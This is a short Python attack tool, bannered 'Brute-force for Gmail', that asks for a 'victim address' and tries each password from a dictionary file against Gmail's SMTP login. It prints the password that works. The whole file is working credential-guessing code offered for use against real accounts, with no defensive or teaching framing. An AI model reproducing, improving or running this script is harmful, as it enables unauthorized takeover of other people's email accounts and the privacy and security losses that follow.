import smtplib
import email.utils
s = "n" 
while s in ['n','N']:
	print("""\033[1;32m
	 _____         _                         _ _  | Author: 
	| __  |___ _ _| |_ ___ ___ ___ _____ ___|_| | | Date: 14/03/2020
	| __ -|  _| | |  _| -_|___| -_|     | .'| | | | Tool: Brute-force for Gmail
	|_____|_| |___|_| |___|   |___|_|_|_|__,|_|_| | More info : Easy-Brute
	""")

	#variaves de entrada
	user = input(" Enter victim address>> ")
	smtp = smtplib.SMTP("smtp.gmail.com", 587)
	smtp.ehlo()
	smtp.starttls()
	word = input(' Press F to pay respect for Author and to select your dictionary: ')
	if word == 'F':
		lista = input(" [!]Dictionary Name: ")
		lista = open(lista, "r").readlines()
		for password in lista:
			try:
				smtp.login(user, password)
				print('[!]Correct password! ', password)
				break
			except smtplib.SMTPAuthenticationError:	
				print('[!]Incorrect password', password)		
	else:
		print( ' Invalid option ' )

	s = input( ' Go out? [S/N]: ' )		
